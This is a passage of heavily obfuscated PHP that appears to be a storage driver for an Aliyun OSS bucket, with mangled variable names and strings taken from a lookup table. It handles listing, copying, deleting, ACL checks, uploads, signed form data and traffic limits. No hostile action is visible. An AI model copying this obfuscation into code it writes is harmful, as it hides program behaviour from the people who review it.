$…ÌşñÒÒ[8] ? !0 : !1; $°¼Í±èê = array($…ÌşñÒÒ[79] => $ïøíåœá, $…ÌşñÒÒ[1475] => $ïøíåœá, $…ÌşñÒÒ[88] => strtotime($ØñÜÖøÃ), $…ÌşñÒÒ[1476] => $ØñÜÖøÃ, $…ÌşñÒÒ[1474] => $ŠÆ«ÅÈ›); $this->cacheMethodInfoSet($õì›¦’ò, $ŒšÈßØ², $°¼Í±èê); if ($ŒšÈßØ²) { $õ°µ‡›[] = $õì›¦’ò; continue; } $Œïİ›åá[] = $°ñ˜Ü; } foreach ($Ìı¹€÷ as $ÜÖ«ûµ¸) { $õ°µ‡›[] = $ÜÖ«ûµ¸->getPrefix(); $this->cacheMethodInfoSet($ÜÖ«ûµ¸->getPrefix(), !0); } if ($ë”õÖ—Ç === $…ÌşñÒÒ[12]) { break; } } $this->cacheMethodInfoSet($°×¤ı¬Š, !0); return array($…ÌşñÒÒ[85] => $õ°µ‡›, $…ÌşñÒÒ[86] => $Œïİ›åá); } public function listObject($ğ¢Å‰€ƒ, $¡›†ùæ— = '') { $Üù¬êè· =& $_SERVER[¢ñàß¿€]; $ğ¢Å‰€ƒ = trim($ğ¢Å‰€ƒ, $Üù¬êè·[8]); $™‰ê•ò = empty($ğ¢Å‰€ƒ) && $ğ¢Å‰€ƒ !== $Üù¬êè·[228] ? $Üù¬êè·[12] : $ğ¢Å‰€ƒ . $Üù¬êè·[8]; $¯•ŸØüÁ = $Üù¬êè·[12]; $¡¢ƒ­¶ = 1000; $íÑ’¦‘Í = $¼¿ƒéù = array(); while (!0) { check_abort(); $„ş´ªÄš = array($Üù¬êè·[1470] => $¡›†ùæ—, $Üù¬êè·[1471] => $™‰ê•ò, $Üù¬êè·[1472] => $¡¢ƒ­¶, $Üù¬êè·[1473] => $¯•ŸØüÁ); try { $ãü·¦Õ¾ = $this->client->listObjects($this->bucket, $„ş´ªÄš); } catch (OSS\Core\OssException $ø§¨µóå) { $this->writeLog(__FUNCTION__ . $Üù¬êè·[214] . $ø§¨µóå->getMessage()); break; } $¯•ŸØüÁ = $ãü·¦Õ¾->getNextMarker(); $©Ş°Ç—¾ = $ãü·¦Õ¾->getObjectList(); foreach ($©Ş°Ç—¾ as $à¬ŒˆÆš) { if ($à¬ŒˆÆš->getKey() == $™‰ê•ò) { continue; } $©™Ç¸™‰ = $à¬ŒˆÆš->getKey(); $Ú¾˜Ñ¨÷ = $à¬ŒˆÆš->getSize(); $Åº½Ëš¹ = $Ú¾˜Ñ¨÷ == 0 && substr($©™Ç¸™‰, strlen($©™Ç¸™‰) - 1, 1) == $Üù¬êè·[8] ? !0 : !1; if ($Åº½Ëš¹) { continue; } (yield $Ú¾˜Ñ¨÷ . $Üù¬êè·[214] . $©™Ç¸™‰); } if ($¯•ŸØüÁ === $Üù¬êè·[12]) { break; } } } public function copyFile($õÇÍéğ€, $§°¨€ªÌ) { $±‡‡á• = $this->size($õÇÍéğ€); if ($±‡‡á• < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $õÇÍéğ€, $this->bucket, $this->pathEncode($§°¨€ªÌ)); } catch (OSS\Core\OssException $”é™ú) { $this->writeLog(__FUNCTION__ . $_SERVER[¢ñàß¿€][214] . $”é™ú->getMessage()); return !1; } return $this->getPathOuter($§°¨€ªÌ); } $¡ ®¸–Œ = $this->multiCopyObject($õÇÍéğ€, $§°¨€ªÌ, $±‡‡á•); return $¡ ®¸–Œ ? $this->getPathOuter($§°¨€ªÌ) : !1; } private function multiCopyObject($ÉŒ¡”í, $ŒÌÖ¦, $ÜË¿ÂÚ¿) { $­ƒƒô ¢ =& $_SERVER[¢ñàß¿€]; try { $öı×ÑÒ = array(); if ($Œüè›¦ò = $this->hashMd5($ÉŒ¡”í)) { $öı×ÑÒ = array(OSS\OssClient::OSS_HEADERS => array($­ƒƒô ¢[1477] => $Œüè›¦ò)); } $ûæ¦û“Ÿ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ŒÌÖ¦), $öı×ÑÒ); $Ÿ¬¨Ù¦® = 1; $ìæè„Ã’ = 0; $ÏçäÙ™Õ = array(); $±‘—ñ±¯ = 1024 * 1024 * 10; $ÎıÏ±×Ñ = $this->client->generateMultiuploadParts($ÜË¿ÂÚ¿, $±‘—ñ±¯); foreach ($ÎıÏ±×Ñ as $í„šÁæ¶ => $£İ¸ú¡†) { $¹û…‹¬û = $ìæè„Ã’ + (int) $£İ¸ú¡†[$­ƒƒô ¢[1478]]; $Ğ¼îî¢ = (int) $£İ¸ú¡†[$­ƒƒô ¢[413]] + $¹û…‹¬û - 1; $¦ğåæ¥ò = array($­ƒƒô ¢[167] => $¹û…‹¬û, $­ƒƒô ¢[168] => $Ğ¼îî¢); $ÏçäÙ™Õ[] = $this->client->uploadPartCopy($this->bucket, $ÉŒ¡”í, $this->bucket, $this->pathEncode($ŒÌÖ¦), $Ÿ¬¨Ù¦®, $ûæ¦û“Ÿ, $¦ğåæ¥ò); $Ÿ¬¨Ù¦® = $Ÿ¬¨Ù¦® + 1; } $í¼¡‚¡¦ = array(); foreach ($ÏçäÙ™Õ as $í„šÁæ¶ => $éââ¨ì¿) { $í¼¡‚¡¦[] = array($­ƒƒô ¢[308] => $í„šÁæ¶ + 1, $­ƒƒô ¢[309] => $éââ¨ì¿); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ŒÌÖ¦), $ûæ¦û“Ÿ, $í¼¡‚¡¦); } catch (OSS\Core\OssException $Å’Îİ†Ù) { $this->writeLog(__FUNCTION__ . $­ƒƒô ¢[214] . $Å’Îİ†Ù->getMessage()); return !1; } return !0; } public function moveFile($¼œš»”Ÿ, $§¿È‹£) { if ($this->copyFile($¼œš»”Ÿ, $§¿È‹£)) { $this->remove($¼œš»”Ÿ); return $this->getPathOuter($§¿È‹£); } return !1; } public function delFile($øÚÏè˜) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($øÚÏè˜)); } catch (OSS\Core\OssException $ğÒ·Ü“Ã) { $this->writeLog(__FUNCTION__ . $_SERVER[¢ñàß¿€][214] . $ğÒ·Ü“Ã->getMessage()); return !1; } return !0; } public function delFolder($®àğ„ëá) { $éæ¥ş›ü =& $_SERVER[¢ñàß¿€]; if (!$this->exist($®àğ„ëá)) { return !0; } $this->listItemCache = !1; $ïÁ àœ§ = $this->fileList($®àğ„ëá); $this->listItemCache = !0; $‹×à—¹ˆ = trim($®àğ„ëá, $éæ¥ş›ü[8]) . $éæ¥ş›ü[8]; if (!empty($®àğ„ëá) && $®àğ„ëá !== $éæ¥ş›ü[228] && !in_array($‹×à—¹ˆ, $ïÁ àœ§[$éæ¥ş›ü[85]])) { $ïÁ àœ§[$éæ¥ş›ü[85]][] = $‹×à—¹ˆ; } $îŞ¶é€Û = $this->delByBatch($ïÁ àœ§[$éæ¥ş›ü[86]]); if (!$îŞ¶é€Û) { return !1; } $îŞ¶é€Û = $this->delByBatch($ïÁ àœ§[$éæ¥ş›ü[85]]); if (!$îŞ¶é€Û) { return !1; } return $this->delFile($‹×à—¹ˆ); } private function delByBatch($ÖèÖêÕñ) { foreach (array_chunk($ÖèÖêÕñ, 1000) as $Òèç¾ø) { try { $this->client->deleteObjects($this->bucket, $Òèç¾ø); } catch (OSS\Core\OssException $íÍå”÷ˆ) { $this->writeLog(__FUNCTION__ . $_SERVER[¢ñàß¿€][214] . $íÍå”÷ˆ->getMessage()); return !1; } } return !0; } public function rename($ÕĞ‹’ Ó, $„ş¡Ó¥) { return $this->renameObject($ÕĞ‹’ Ó, $„ş¡Ó¥); } private function fileInfo($†ƒ¢€ìÕ, $ç†ÆŸüĞ = false, $ÒÆÍÃŠş = array()) { $¨Ùóİı» =& $_SERVER[¢ñàß¿€]; $ï ˜Â®™ = array($¨Ùóİı»[32] => $this->pathThis($†ƒ¢€ìÕ), $¨Ùóİı»[87] => $this->getPathOuter($†ƒ¢€ìÕ), $¨Ùóİı»[33] => $¨Ùóİı»[230], $¨Ùóİı»[79] => isset($ÒÆÍÃŠş[$¨Ùóİı»[79]]) ? $ÒÆÍÃŠş[$¨Ùóİı»[79]] : 0, $¨Ùóİı»[169] => $this->ext($†ƒ¢€ìÕ)); if ($ç†ÆŸüĞ) { return $ï ˜Â®™; } $ï ˜Â®™[$¨Ùóİı»[231]] = $ï ˜Â®™[$¨Ùóİı»[88]] = 0; $ï ˜Â®™[$¨Ùóİı»[232]] = $ï ˜Â®™[$¨Ùóİı»[233]] = !0; if (empty($ÒÆÍÃŠş)) { $û¼ªœ­ = $this->objectMeta($†ƒ¢€ìÕ); if (!$û¼ªœ­) { return $ï ˜Â®™; } $ÒÆÍÃŠş = array($¨Ùóİı»[88] => strtotime($û¼ªœ­[$¨Ùóİı»[1476]]), $¨Ùóİı»[79] => $û¼ªœ­[$¨Ùóİı»[1475]] + 0, $¨Ùóİı»[1474] => $û¼ªœ­[$¨Ùóİı»[1474]]); } if (isset($ÒÆÍÃŠş[$¨Ùóİı»[1474]]) && $ÒÆÍÃŠş[$¨Ùóİı»[1474]]) { $ï ˜Â®™[$¨Ùóİı»[235]] = trim($ÒÆÍÃŠş[$¨Ùóİı»[1474]], $¨Ùóİı»[121]); } if (isset($ÒÆÍÃŠş[$¨Ùóİı»[79]])) { $ï ˜Â®™[$¨Ùóİı»[79]] = $ÒÆÍÃŠş[$¨Ùóİı»[79]]; } if (isset($ÒÆÍÃŠş[$¨Ùóİı»[88]])) { $ï ˜Â®™[$¨Ùóİı»[88]] = $ÒÆÍÃŠş[$¨Ùóİı»[88]]; } if (isset($ÒÆÍÃŠş[$¨Ùóİı»[206]]) && !trim($ï ˜Â®™[$¨Ùóİı»[88]])) { $ï ˜Â®™[$¨Ùóİı»[88]] = $ÒÆÍÃŠş[$¨Ùóİı»[206]]; } return $ï ˜Â®™; } private function folderInfo($íûİÏË, $î‰Èî• = false, $©…çğşˆ = array()) { $¿èÌ¥ú¸ =& $_SERVER[¢ñàß¿€]; $†ö£Î© = array($¿èÌ¥ú¸[32] => $this->pathThis($íûİÏË), $¿èÌ¥ú¸[87] => $this->getPathOuter($¿èÌ¥ú¸[8] . $íûİÏË), $¿èÌ¥ú¸[33] => $¿èÌ¥ú¸[78]); if ($î‰Èî•) { return $†ö£Î©; } $†ö£Î©[$¿èÌ¥ú¸[231]] = $†ö£Î©[$¿èÌ¥ú¸[88]] = 0; $†ö£Î©[$¿èÌ¥ú¸[232]] = $†ö£Î©[$¿èÌ¥ú¸[233]] = !0; if (empty($©…çğşˆ)) { $íûİÏË = rtrim($íûİÏË, $¿èÌ¥ú¸[8]) . $¿èÌ¥ú¸[8]; $Ï±øË”£ = $this->objectMeta($íûİÏË); if (!$Ï±øË”£) { return $†ö£Î©; } $©…çğşˆ = array($¿èÌ¥ú¸[231] => $Ï±øË”£[$¿èÌ¥ú¸[575]][$¿èÌ¥ú¸[1479]], $¿èÌ¥ú¸[88] => strtotime($Ï±øË”£[$¿èÌ¥ú¸[1476]])); } if (isset($©…çğşˆ[$¿èÌ¥ú¸[88]])) { $†ö£Î©[$¿èÌ¥ú¸[88]] = $©…çğşˆ[$¿èÌ¥ú¸[88]]; } if (isset($©…çğşˆ[$¿èÌ¥ú¸[231]])) { $†ö£Î©[$¿èÌ¥ú¸[231]] = $©…çğşˆ[$¿èÌ¥ú¸[231]]; } return $†ö£Î©; } public function listPath($¼İŠäñ, $Õ²œ„†œ = false) { $§´–Û´³ =& $_SERVER[¢ñàß¿€]; $¸æá¦Ü¹ = $this->fileList($¼İŠäñ, $§´–Û´³[8], !0); foreach ($¸æá¦Ü¹[$§´–Û´³[85]] as $°ˆØË¡· => $”˜«ÇÊ®) { $¸æá¦Ü¹[$§´–Û´³[85]][$°ˆØË¡·] = $this->folderInfo($”˜«ÇÊ®, $Õ²œ„†œ, $”˜«ÇÊ®); } foreach ($¸æá¦Ü¹[$§´–Û´³[86]] as $°ˆØË¡· => $”˜«ÇÊ®) { $¸æá¦Ü¹[$§´–Û´³[86]][$°ˆØË¡·] = $this->fileInfo($”˜«ÇÊ®[$§´–Û´³[32]], $Õ²œ„†œ, $”˜«ÇÊ®); } return $¸æá¦Ü¹; } protected function infoChildren($ñÑ¯Š‹Ó, &$Œ³±Ñå) { $áûä§Á´ =& $_SERVER[¢ñàß¿€]; $®€³Šó’ = $this->fileList($ñÑ¯Š‹Ó, $áûä§Á´[12], !0); $Œ³±Ñå[$áûä§Á´[81]] += count($®€³Šó’[$áûä§Á´[85]]); $Œ³±Ñå[$áûä§Á´[80]] += count($®€³Šó’[$áûä§Á´[86]]); foreach ($®€³Šó’[$áûä§Á´[86]] as $Äõ ¨²) { if (!$Äõ ¨² || !$Äõ ¨²[$áûä§Á´[79]]) { continue; } $Œ³±Ñå[$áûä§Á´[79]] += $Äõ ¨²[$áûä§Á´[79]]; } } public function has($ó‘”ÃË«, $¬ò¡ØŒœ = false, $—´Ü²§× = true) { $µ²‡±‡Ÿ =& $_SERVER[¢ñàß¿€]; $ó‘”ÃË« = trim($ó‘”ÃË«, $µ²‡±‡Ÿ[8]); $ ‡Ñ¤à = empty($ó‘”ÃË«) && $ó‘”ÃË« !== $µ²‡±‡Ÿ[228] ? $µ²‡±‡Ÿ[12] : $ó‘”ÃË« . $µ²‡±‡Ÿ[8]; $±½Ú°¾á = $µ²‡±‡Ÿ[12]; $»Ÿ­ÏÄè = 500; $ìÉ¨æ = $ù¿“íäØ = 0; while (!0) { check_abort(); $™ı™£¾â = array($µ²‡±‡Ÿ[1470] => $µ²‡±‡Ÿ[8], $µ²‡±‡Ÿ[1471] => $ ‡Ñ¤à, $µ²‡±‡Ÿ[1472] => $»Ÿ­ÏÄè, $µ²‡±‡Ÿ[1473] => $±½Ú°¾á); try { $ºÄ«ÏÅ” = $this->client->listObjects($this->bucket, $™ı™£¾â); } catch (OSS\Core\OssException $õŞÕÌ—ã) { $this->writeLog(__FUNCTION__ . $µ²‡±‡Ÿ[214] . $õŞÕÌ—ã->getMessage()); break; } $±½Ú°¾á = $ºÄ«ÏÅ”->getNextMarker(); $¯€œ¸â” = $ºÄ«ÏÅ”->getObjectList(); $Ú§¢”Ê… = $ºÄ«ÏÅ”->getPrefixList(); if ($¬ò¡ØŒœ) { if (count($¯€œ¸â”) > 1 || count($¯€œ¸â”) == 1 && $¯€œ¸â”[0]->getKey() != $ ‡Ñ¤à) { $ìÉ¨æ += count($¯€œ¸â”) - 1; } if (!empty($Ú§¢”Ê…)) { $ù¿“íäØ += count($Ú§¢”Ê…); } if ($±½Ú°¾á === $µ²‡±‡Ÿ[12]) { break; } continue; } if ($—´Ü²§×) { if (!empty($¯€œ¸â”)) { if (count($¯€œ¸â”) > 1 || $¯€œ¸â”[0]->getKey() != $ ‡Ñ¤à) { return !0; } } } else { if (!empty($Ú§¢”Ê…)) { return !0; } } if ($±½Ú°¾á === $µ²‡±‡Ÿ[12]) { break; } } if ($¬ò¡ØŒœ) { return array($µ²‡±‡Ÿ[239] => $ìÉ¨æ, $µ²‡±‡Ÿ[240] => $ù¿“íäØ); } return !1; } public function listAll($…ÔÏµ¿Ù) { $£Ş‰œ‡Š =& $_SERVER[¢ñàß¿€]; $ù„ÙöÄ = $this->fileList($…ÔÏµ¿Ù, $£Ş‰œ‡Š[12], !0); $ÔçÙã“ã = array_to_keyvalue($ù„ÙöÄ[$£Ş‰œ‡Š[86]], $£Ş‰œ‡Š[32]); foreach ($ù„ÙöÄ[$£Ş‰œ‡Š[85]] as $Ãáå§½­) { if (is_string($Ãáå§½­)) { $ÔçÙã“ã[$Ãáå§½­] = array($£Ş‰œ‡Š[79] => 0); } } return $this->listAllFiles($…ÔÏµ¿Ù, $ÔçÙã“ã); } public function canRead($Ì£áß) { $¨°˜½Òˆ =& $_SERVER[¢ñàß¿€]; $®€Ù›ÒÇ = $this->pathAcl($Ì£áß); return $®€Ù›ÒÇ == $¨°˜½Òˆ[1480] || $®€Ù›ÒÇ == $¨°˜½Òˆ[619] ? !0 : !1; } public function canWrite($¢ß¯¢õÖ) { $›™‚ó•÷ = $this->pathAcl($¢ß¯¢õÖ); return $›™‚ó•÷ == $_SERVER[¢ñàß¿€][619] ? !0 : !1; } public function pathAcl($ÒÌãËû) { $ŠóßìÀ =& $_SERVER[¢ñàß¿€]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Ş¸õ÷öî = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ÒÌãËû)); } catch (OSS\Core\OssException $¾åƒËéÉ) { $this->writeLog(__FUNCTION__ . $ŠóßìÀ[214] . $¾åƒËéÉ->getMessage()); return !1; } $’¿ë¸º = $Ş¸õ÷öî == $ŠóßìÀ[37] ? $this->bucketAcl : $Ş¸õ÷öî; if ($’¿ë¸º == $ŠóßìÀ[1481]) { return $ŠóßìÀ[1480]; } if ($’¿ë¸º == $ŠóßìÀ[1482]) { return $ŠóßìÀ[619]; } return $’¿ë¸º; } private function chmodPath($Ú¤€äî¤, $Áû…Ò…§ = '') { $î¤ß©Ò =& $_SERVER[¢ñàß¿€]; $œì…¦Ÿ¯ = empty($Áû…Ò…§) ? $î¤ß©Ò[1482] : $Áû…Ò…§; $ØòğĞ‚€ = array($î¤ß©Ò[37], $î¤ß©Ò[229], $î¤ß©Ò[1481], $î¤ß©Ò[1482]); if (!in_array($œì…¦Ÿ¯, $ØòğĞ‚€)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Ú¤€äî¤), $œì…¦Ÿ¯); } catch (OSS\Core\OssException $ÚÅ¡’ÖÊ) { $this->writeLog(__FUNCTION__ . $î¤ß©Ò[214] . $ÚÅ¡’ÖÊ->getMessage()); return !1; } return !0; } public function getContent($·ìÔ) { return $this->fileSubstr($·ìÔ, -1); } public function setContent($ñ²øÖ…ˆ, $€ŠÆÆé¯ = '') { $Ÿ¸ÑÔÌ =& $_SERVER[¢ñàß¿€]; try { $´í®İÛ¥ = $this->trafficLimit($Ÿ¸ÑÔÌ[1483]); $éıó¯ı§ = $this->client->putObject($this->bucket, $this->pathEncode($ñ²øÖ…ˆ), $€ŠÆÆé¯, $´í®İÛ¥); } catch (OSS\Core\OssException $õ‹æûÉ—) { $this->writeLog(__FUNCTION__ . $Ÿ¸ÑÔÌ[214] . $õ‹æûÉ—->getMessage()); return !1; } $½»ùÁÙ = array($Ÿ¸ÑÔÌ[1477] => trim($éıó¯ı§[$Ÿ¸ÑÔÌ[1474]], $Ÿ¸ÑÔÌ[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ñ²øÖ…ˆ))); $this->updateObjMeta($ñ²øÖ…ˆ, $½»ùÁÙ); return isset($éıó¯ı§[$Ÿ¸ÑÔÌ[1484]][$Ÿ¸ÑÔÌ[292]]) ? !0 : !1; } private function updateObjMeta($¯Ö‚úæ“, $Æò½íÒ) { $¯Ö‚úæ“ = $this->pathEncode($¯Ö‚úæ“); try { $Ş˜Ù‹° = array(OSS\OssClient::OSS_HEADERS => $Æò½íÒ); $this->client->copyObject($this->bucket, $¯Ö‚úæ“, $this->bucket, $¯Ö‚úæ“, $Ş˜Ù‹°); } catch (OSS\Core\OssException $«­èÄò¬) { $this->writeLog(__FUNCTION__ . $_SERVER[¢ñàß¿€][214] . $«­èÄò¬->getMessage()); return !1; } return !0; } public function upload($œ¾ûş—Ñ, $‹Æ›é¥“, $”ØÂ½á¬ = false, $«‹éñº = REPEAT_REPLACE) { $å”æ›Óã =& $_SERVER[¢ñàß¿€]; $¯ê“×ıµ = trim($œ¾ûş—Ñ, $å”æ›Óã[8]); $ÛÚ¸ÔÁ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($å”æ›Óã[1477] => @md5_file($‹Æ›é¥“)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($œ¾ûş—Ñ))); $ÛÚ¸ÔÁ = $this->trafficLimit($å”æ›Óã[1483], $ÛÚ¸ÔÁ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($¯ê“×ıµ), $‹Æ›é¥“, $ÛÚ¸ÔÁ); } catch (OSS\Core\OssException $€½Ğ’ù¤) { $this->writeLog(__FUNCTION__ . $å”æ›Óã[214] . $€½Ğ’ù¤->getMessage()); return !1; } return $this->getPathOuter($œ¾ûş—Ñ); } public function getHost() { $‰ÃÂîÀ =& $_SERVER[¢ñàß¿€]; $–•Ò¤¥ = explode($‰ÃÂîÀ[210], parent::getHost()); return $–•Ò¤¥[0] . $‰ÃÂîÀ[210] . $this->bucket . $‰ÃÂîÀ[10] . $–•Ò¤¥[1]; } public function uploadFormData($ÕŸ†ÁõÏ, $ª§½Ö¿ = 3600) { $¦—ĞÏ¿‚ =& $_SERVER[¢ñàß¿€]; if (!($¿ÊÑÎõÍ = $this->getHost())) { return !1; } $ÆıçËó = $ª§½Ö¿; $´”µàÁŒ = date($¦—ĞÏ¿‚[1485], time() + $ÆıçËó); $ı°›ÅšÒ = new DateTime($´”µàÁŒ); $œáœúş = $ı°›ÅšÒ->format(DateTime::ISO8601); $ê¥µà¾ã = strpos($œáœúş, $¦—ĞÏ¿‚[372]); $œáœúş = substr($œáœúş, 0, $ê¥µà¾ã) . $¦—ĞÏ¿‚[1486]; $Ÿ£ÒÉçà = 1048576000 * 5; $Ø«‘ôÌ¦ = $this->pathFather($ÕŸ†ÁõÏ); $¨Ë˜‡ æ = array($¦—ĞÏ¿‚[275] => $œáœúş, $¦—ĞÏ¿‚[278] => array(array($¦—ĞÏ¿‚[1487], 0, $Ÿ£ÒÉçà), array($¦—ĞÏ¿‚[281], $¦—ĞÏ¿‚[282], $Ø«‘ôÌ¦))); $øãˆë¤Ï = base64_encode(json_encode($¨Ë˜‡ æ)); $´º˜¾· = base64_encode(hash_hmac($¦—ĞÏ¿‚[263], $øãˆë¤Ï, $this->secret, !0)); $‡š›™Şß = array($¦—ĞÏ¿‚[293] => $øãˆë¤Ï, $¦—ĞÏ¿‚[1488] => $this->accessKey, $¦—ĞÏ¿‚[285] => $¦—ĞÏ¿‚[274], $¦—ĞÏ¿‚[1489] => $´º˜¾·, $¦—ĞÏ¿‚[208] => $¿ÊÑÎõÍ); $‡š›™Şß = $this->trafficLimit($¦—ĞÏ¿‚[1483], $‡š›™Şß); return $‡š›™Şß; } public function multiUploadFormData($ÎËÚ«´¥, $äîÜÁ›² = 3600) { $èåŠ½š =& $_SERVER[¢ñàß¿€]; if (!($ı›²ÒŞ¬ = $this->getHost())) { return !1; } $ÁÎŸ¦š‘ = $this->trafficLimit($èåŠ½š[1483]); $™÷¢ãÀ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÎËÚ«´¥), $ÁÎŸ¦š‘); return array($èåŠ½š[254] => $™÷¢ãÀ, $èåŠ½š[208] => $ı›²ÒŞ¬ . $èåŠ½š[8] . $this->pathEncode($ÎËÚ«´¥), $èåŠ½š[255] => gmdate($èåŠ½š[1490]), $èåŠ½š[97] => $ÎËÚ«´¥); } public function multiUploadAuthData($ß¾²¸á, $ ¸Ÿü¤‡ = array()) { $„œá‹µ =& $_SERVER[¢ñàß¿€]; $–Ş§Ó®Ï = isset($ ¸Ÿü¤‡[$„œá‹µ[255]]) ? $ ¸Ÿü¤‡[$„œá‹µ[255]] : gmdate($„œá‹µ[1490]); $í¡ıñ‚™ = isset($ ¸Ÿü¤‡[$„œá‹µ[169]]) ? $ ¸Ÿü¤‡[$„œá‹µ[169]] : $„œá‹µ[12]; $³ÃŸ€à = $ß¾²¸á; if (isset($ ¸Ÿü¤‡[$„œá‹µ[97]])) { $³ÃŸ€à = $ ¸Ÿü¤‡[$„œá‹µ[97]]; unset($ ¸Ÿü¤‡[$„œá‹µ[97]]); } if (isset($ ¸Ÿü¤‡[$„œá‹µ[256]])) { $ ¸Ÿü¤‡[$„œá‹µ[255]] = $–Ş§Ó®Ï; return $this->listUploadParts($³ÃŸ€à, $ ¸Ÿü¤‡); } $Î©œ—Ø = array($„œá‹µ[257], $„œá‹µ[12], $„œá‹µ[123], $–Ş§Ó®Ï, "\170\x2d\157\163\x73\55\x64\141\x74\x65\x3a{$–Ş§Ó®Ï}", $„œá‹µ[8] . $this->bucket . $„œá‹µ[8] . $³ÃŸ€à . $í¡ıñ‚™); if (strpos($í¡ıñ‚™, $„œá‹µ[258]) === 0) { $Î©œ—Ø[0] = $„œá‹µ[259]; if ($á˜àóİû = $this->trafficLimit($„œá‹µ[1483])) { $³ÃŸ€à = $„œá‹µ[1491]; array_splice($Î©œ—Ø, 5, 0, $³ÃŸ€à . $„œá‹µ[4] . $á˜àóİû[$³ÃŸ€à]); } } if (isset($ ¸Ÿü¤‡[$„œá‹µ[260]]) && $ ¸Ÿü¤‡[$„œá‹µ[260]] == $„œá‹µ[261]) { $Î©œ—Ø[0] = $„œá‹µ[261]; } if (!empty($ ¸Ÿü¤‡[$„œá‹µ[1492]])) { $ıÈ˜Àñ‰ = array_merge(array($Î©œ—Ø[4]), $ ¸Ÿü¤‡[$„œá‹µ[1492]]); sort($ıÈ˜Àñ‰); $Î©œ—Ø[4] = implode($„œá‹µ[262], $ıÈ˜Àñ‰); } $«ÄçšÀ = implode($„œá‹µ[262], $Î©œ—Ø); $ÀŒáÁ› = base64_encode(hash_hmac($„œá‹µ[263], $«ÄçšÀ, $this->secret, !0)); $·û…È = $„œá‹µ[1460] . $this->accessKey . $„œá‹µ[4] . $ÀŒáÁ›; if (strpos($í¡ıñ‚™, $„œá‹µ[258]) === 0) { $·û…È = array($„œá‹µ[265] => $·û…È, $„œá‹µ[255] => $–Ş§Ó®Ï); if ($á˜àóİû) { $·û…È = array_merge($·û…È, $á˜àóİû); } } return $·û…È; } public function listUploadParts($âëÔ—Ôñ, $ğ³éŸøÎ) { $ÍßÖã¤ =& $_SERVER[¢ñàß¿€]; $äÙÒĞñ = parse_url_query($ğ³éŸøÎ[$ÍßÖã¤[169]]); $”³ëÑÑ‘ = $this->client->listParts($this->bucket, $this->pathEncode($âëÔ—Ôñ), $äÙÒĞñ[$ÍßÖã¤[254]]); $Áñ‡îÒ· = $”³ëÑÑ‘->getListPart(); $ÛÈŸÃüõ = array(); foreach ($Áñ‡îÒ· as $±î£øÏ¬) { $ÛÈŸÃüõ[] = array($ÍßÖã¤[308] => $±î£øÏ¬->getPartNumber(), $ÍßÖã¤[309] => trim($±î£øÏ¬->getETag(), $ÍßÖã¤[121])); } unset($ğ³éŸøÎ[$ÍßÖã¤[256]], $ğ³éŸøÎ[$ÍßÖã¤[260]]); $¸úÚ§Ù = $this->multiUploadAuthData($âëÔ—Ôñ, $ğ³éŸøÎ); if (empty($¸úÚ§Ù)) { return !1; } return array($ÍßÖã¤[265] => $¸úÚ§Ù, $ÍßÖã¤[255] => $ğ³éŸøÎ[$ÍßÖã¤[255]], $ÍßÖã¤[267] => $ÛÈŸÃüõ); } public function download($îé÷˜ô­, $íºˆ£¦Ô) { $¶¨ÖÇœß =& $_SERVER[¢ñàß¿€]; if ($this->isFolder($îé÷˜ô­)) { return !1; } try { $›Ÿáí¦— = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $íºˆ£¦Ô); $›Ÿáí¦— = $this->trafficLimit($¶¨ÖÇœß[112], $›Ÿáí¦—); $this->client->getObject($this->bucket, $this->pathEncode($îé÷˜ô­), $›Ÿáí¦—); } catch (OSS\Core\OssException $öñù÷¬§) { $this->writeLog(__FUNCTION__ . $¶¨ÖÇœß[214] . $öñù÷¬§->getMessage()); return !1; } return $íºˆ£¦Ô; } public function fileSubstr($ã¡¯«ş§, $‘“©ÃÕÕ = 0, $ëë¤­ƒ = false) { if ($‘“©ÃÕÕ === -1) { $Äû¥›å = array(); } else { if ($ëë¤­ƒ === !1) { $®Ñ±ÃÎÖ = $this->size($ã¡¯«ş§); } else { $®Ñ±ÃÎÖ = $‘“©ÃÕÕ + $ëë¤­ƒ - 1; } $Äû¥›å = array(OSS\OssClient::OSS_RANGE => "{$‘“©ÃÕÕ}\55{$®Ñ±ÃÎÖ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ã¡¯«ş§), $Äû¥›å); } catch (OSS\Core\OssException $˜Ì¯ê½İ) { $this->writeLog(__FUNCTION__ . $_SERVER[¢ñàß¿€][214] . $˜Ì¯ê½İ->getMessage()); think_exception($˜Ì¯ê½İ->getMessage()); return !1; } } private function trafficLimit($áçªÜÛ¯, $öÎ‚‚şÈ = array()) { $Ê°òÈÆµ =& $_SERVER[¢ñàß¿€]; if ($áçªÜÛ¯ == $Ê°òÈÆµ[1483] && $this->isUploadServer() || $áçªÜÛ¯ == $Ê°òÈÆµ[112] && $this->isFileOutServer()) { return $öÎ‚‚şÈ; } $¦æÜòù = floatval($GLOBALS[$Ê°òÈÆµ[6]][$Ê°òÈÆµ[92]][$Ê°òÈÆµ[110]][$áçªÜÛ¯]) * 1024 * 1024 * 8; if (!$¦æÜòù) { return $öÎ‚‚şÈ; } $¦æÜòù = $¦æÜòù < 819200 ? 819200 : ($¦æÜòù > 838860800 ? 838860800 : $¦æÜòù); $öÎ‚‚şÈ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¦æÜòù); return $öÎ‚‚şÈ; } public function link($àƒÊ£‚ˆ, $ñö›¦ÛÉ = array()) { $ğ³Ù‚ñ =& $_SERVER[¢ñàß¿€]; if (!$this->exist($àƒÊ£‚ˆ) || $this->isFolder($àƒÊ£‚ˆ)) { return !1; } try { $ñö›¦ÛÉ = $this->trafficLimit($ğ³Ù‚ñ[112], $ñö›¦ÛÉ); $œÆÃø°­ = $this->client->signUrl($this->bucket, $this->pathEncode($àƒÊ£‚ˆ), 